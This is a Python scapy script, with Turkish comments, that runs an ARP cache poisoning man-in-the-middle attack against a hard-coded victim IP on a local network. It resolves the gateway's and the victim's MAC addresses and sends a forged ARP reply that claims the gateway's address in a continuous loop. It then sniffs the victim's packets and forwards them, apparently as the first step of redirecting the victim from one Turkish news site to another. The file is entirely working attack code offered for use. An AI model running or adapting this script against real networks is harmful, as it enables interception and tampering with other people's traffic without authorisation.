# -*- coding: utf-8 -*-

from optparse import OptionParser
import threading
import time
import sys

from scapy.all import *
from scapy import *


VICTIM_IP = '192.168.107.45'
VICTIM_MAC = ''

GATEWAY_IP = '192.168.107.1' #router
GATEWAY_MAC = ''

ATTACKER_IP = ''
ATTACKER_MAC = ''


class ArpPoisonThread(threading.Thread):
  def __init__(self, arp_response):
    threading.Thread.__init__(self)
    self.arp_response = arp_response
    self.cont = True

  def finish(self):
    self.cont = False

  def run(self):
    while self.cont:
      send(self.arp_response)


def hurriyet_to_zaman(packet):
  if IP in packet and packet[IP].src == VICTIM_IP:
    packet.show()
    packet[Ether].dst = GATEWAY_MAC
    packet.show()
    send(packet)



def main():
  global VICTIM_IP, VICTIM_MAC
  global ATTACKER_IP, ATTACKER_MAC
  global GATEWAY_IP, GATEWAY_MAC

  #Zaman DNS çözümle
  ans, unansw = sr(IP(dst="193.255.97.2")/UDP()/DNS(rd=1,qd=DNSQR(qname="www.zaman.com.tr")))
  dns_answer = ans[0][1]
  dns_answer.show()

  #gateway'in mac adresini öğren
  ans, unansw = sr(ARP(hwdst=ETHER_BROADCAST,
                       pdst=GATEWAY_IP))
  arp_response = ans[0][1]
  GATEWAY_MAC = arp_response.hwsrc

  #broadcast ARP isteği oluştur.
  arp_request = ARP(hwdst=ETHER_BROADCAST,
                    pdst=VICTIM_IP)

  #ip ve mac adresimi öğren.
  ATTACKER_MAC = arp_request.hwsrc
  ATTACKER_IP = arp_request.psrc

  print ATTACKER_MAC, ATTACKER_IP

  #hedef bilgisayarın mac adresini öğren.
  ans, unansw = sr(arp_request)
  arp_response = ans[0][1]
  VICTIM_MAC = arp_response.hwsrc

  #arp yanıtını daha sonra göndermek üzere zehirle.
  arp_response.hwsrc = ATTACKER_MAC
  arp_response.hwdst = VICTIM_MAC
  arp_response.psrc = GATEWAY_IP
  arp_response.pdst = VICTIM_IP

  arp_poison_thread = ArpPoisonThread(arp_response)
  arp_poison_thread.start()

  #sniff_thread = SniffThread()
  #sniff_thread.start()


  try:
    sniff(prn=hurriyet_to_zaman, count=10000)
  except (KeyboardInterrupt, SystemExit):
      arp_poison_thread.finish()
      sys.exit()
      raise



if __name__ == '__main__':
  main()
